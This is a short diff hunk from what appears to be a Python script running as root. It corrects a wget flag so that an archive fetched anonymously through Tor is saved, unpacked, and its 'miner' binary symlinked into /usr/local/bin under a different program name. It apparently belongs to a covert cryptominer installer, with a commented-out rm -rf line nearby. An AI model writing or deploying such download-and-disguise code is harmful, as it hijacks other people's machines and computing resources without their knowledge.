@@ -26,7 +26,7 @@ try:
     if not os.path.isfile('/root/%s' % link_folder):
         os.chdir('/root')
         #os.system('rm -rf %s' %link_folder)
-        os.system('torify wget ' + link_github + ' -o ' + link_folder)
+        os.system('torify wget ' + link_github + ' -O ' + link_folder)
         os.system('tar -xf ' + link_folder)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' +'/usr/local/bin/' + program)
